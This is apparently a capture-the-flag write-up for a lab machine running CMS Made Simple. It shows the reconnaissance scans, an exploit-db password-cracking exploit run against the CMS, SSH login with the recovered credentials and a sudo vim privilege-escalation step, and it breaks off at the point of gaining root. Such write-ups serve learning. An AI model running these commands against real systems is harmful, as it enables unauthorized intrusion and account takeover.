## Enumeration
### Nmap Scan
The first step of my enumeration was a scan with **nmap**. by the command:

```
nmap 10.10.198.35 -sC 
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-22 13:14 EDT
Nmap scan report for 10.10.198.35
Host is up (0.11s latency).

Nmap done: 1 IP address (1 host up) scanned in 40.71 seconds

```

The “Nmap Output” displayed `2` services running under port 1000 and ssh service running on the higher port.

### Gobuster Scan
I next decided to run a gobuster scan on the webserver to see if there were any interesting hidden directories, by the command:

```
gobuster dir -u http://10.10.198.35  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,xml,php
```

## Exploring 

Browsing to ***http://10.10.198.35/simple*** gives us the version of CMS Made Simple:

![Version](/images/Simple/version.jpg)

I then searched for the cve on [exploit-db](https://www.exploit-db.com/exploits/46635) and found the cve with the exploit:

![CVE](/images/Simple/cve.jpg)

## Exploiting

Then I run the exploit using python (version 2.7) inside a virtual environment:

```
python cms_pa.py -u http://10.10.198.35/simple/ -c -w rockyou.txt
```

## User Flag

And now I tried to access SSH with the credentials that We found:

```
mitch@secret
```

```
ssh -p 2222 mitch@10.10.198.35
```

```
G00d *************
```

## Root Flag

So now I tried the infamous `sudo -l` comand to privilege escalate the system

```
sudo -l
```
And i found that **mitch** can run vim with root privileges with ***NOPASSWD***

```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

And now we're root:
